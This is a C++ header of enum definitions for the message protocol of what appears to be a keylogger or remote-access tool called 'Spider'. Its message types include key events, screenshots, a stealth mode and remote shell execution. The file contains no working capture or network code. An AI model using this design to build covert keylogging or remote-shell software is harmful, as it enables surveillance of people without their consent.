//
// Created by doom on 29/09/17.
//

#ifndef SPIDER_PROTO_MESSAGESENUMS_HPP
#define SPIDER_PROTO_MESSAGESENUMS_HPP

#include <utils/Enums.hpp>

namespace spi::proto
{
    ENUM(MessageType,
         Unknown,
         ReplyCode,
         Bye,
         RawData,
         Hello,
         KeyEvent,
         MouseClick,
         MouseMove,
         ImageData,
         StealthMode,
         ActiveMode,
         Screenshot,
         RList,
         RListReply,
         RStealthMode,
         RActiveMode,
         RScreenshot,
         WindowChange,
         RunShell,
         RRunShell
    );

#ifdef USING_MSVC
#include "Generated.hpp"
#else

    ENUM(KeyCode,
         a, b, c, d, e,
         f, g, h, i, j,
         k, l, m, n, o,
         p, q, r, s, t,
         u, v, w, x, y,
         z,

         A, B, C, D, E,
         F, G, H, I, J,
         K, L, M, N, O,
         P, Q, R, S, T,
         U, V, W, X, Y,
         Z,

         _0, _1, _2, _3, _4,
         _5, _6, _7, _8, _9,

         F1, F2, F3, F4, F5, F6,
         F7, F8, F9, F10, F11, F12,

         Escape,

         Tab, CapsLock, Shift, Ctrl,
         Fn, Home, Alt, Space, AltGr,
         Left, Right, Up, Down,
         PageDown, PageUp,
         End, Start,
         Inser,
         Backspace, Delete,

         Enter,

         AcuteE, GraveE,
         CedillaC, GraveA,
         GraveU,

         Comma, Semicolon, Colon,

         Exclamation, Interrogation, Dot,

         Slash, Backslash,
         Underscore, Pipe,

         Selection, Ampersand,
         Tilde, Sharp,
         Dollar, Euro, Pound, Currency,
         Caret, Trema, Arobase,

         Quote, DoubleQuote, BackQuote,
         Inferior, Superior,

         OpeningParenthesis, ClosingParenthesis,
         OpeningBracket, ClosingBracket,
         OpeningSquareBracket, ClosingSquareBracket,

         Plus, Dash,
         Star, Modulo, Equal,

         Mu,

         Round
    );
#endif

    ENUM(KeyState, Up, Down);

    ENUM(MouseButton,
         Left,
         Middle,
         Right
    );

    ENUM(ReplyType,
         KO,
         OK,
         Update
    );
}

#endif //SPIDER_PROTO_MESSAGESENUMS_HPP
